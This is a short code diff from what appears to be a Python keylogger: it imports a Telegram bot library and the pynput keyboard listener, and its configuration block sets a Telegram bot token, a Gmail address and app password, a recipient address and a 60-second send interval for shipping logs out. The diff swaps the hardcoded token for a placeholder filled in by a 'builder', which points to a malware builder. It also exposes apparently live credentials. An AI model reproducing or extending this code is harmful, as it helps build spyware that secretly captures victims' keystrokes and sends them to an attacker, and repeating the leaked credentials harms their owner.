@@ -11,12 +11,13 @@ import telebot # pip install pyTelegramBotAPI
 from pynput import keyboard # pip install pynput
 
 # ================= USER CONFIGURATION (HARDCODED) ===================
-BOT_TOKEN = "8583908951:AAGKAFyJtoPmpX_DeI5ILO77J4OyxMnB8TY"
+# ================= USER CONFIGURATION ===================
+BOT_TOKEN = "TOKEN_PLACEHOLDER"  # AUTOMATICALLY REPLACED BY BUILDER
 EMAIL_ADDRESS = "prakashwijesinghanew@gmail.com"
 EMAIL_PASSWORD = "fner adgz ooqy jmps"
 TO_EMAIL = "prakashwijesinghanew@gmail.com"
 SEND_INTERVAL = 60
-CONFIG_FILE = "config.json"
+CONFIG_FILE = "log_config.json"
 # ===================================================================
 
 def get_config():
